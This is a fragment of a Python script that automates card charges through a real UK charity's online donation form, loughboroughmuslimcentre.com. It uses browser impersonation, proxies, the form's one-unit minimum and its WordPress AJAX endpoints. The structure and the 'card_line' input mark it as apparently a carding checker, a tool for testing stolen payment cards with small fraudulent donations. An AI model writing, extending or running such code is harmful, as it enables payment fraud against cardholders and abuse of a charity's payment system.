    ...
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ...
        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            try:
                ...
                headers_init = {
                    "referer": "https://loughboroughmuslimcentre.com/donate/",
                }
                params_init = {"giveDonationFormInIframe": "1"}
                resp_init = await session.get(
                    "https://loughboroughmuslimcentre.com/donate/donation-form",
                    params=params_init,
                ...
                headers_ajax1 = {
                    "origin": "https://loughboroughmuslimcentre.com",
                    "referer": "https://loughboroughmuslimcentre.com/donate/donation-form?giveDonationFormInIframe=1",
                ...
                data_ajax1 = {
                    ...
                    "give-current-url": "https://loughboroughmuslimcentre.com/donate/",
                    "give-form-url": "https://loughboroughmuslimcentre.com/donate/donation-form/",
                    "give-form-minimum": "1",
                ...
                await session.post(
                    "https://loughboroughmuslimcentre.com/wp-admin/admin-ajax.php",
                    headers=headers_ajax1,
                    data=data_ajax1,
                )

                # Step 3: Second AJAX - create order (multipart/form-data)
                headers_ajax2 = {
                    "origin": "https://loughboroughmuslimcentre.com",
                    "referer": "https://loughboroughmuslimcentre.com/donate/donation-form?giveDonationFormInIframe=1",
                }
...
async def process_paypal_2(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    """
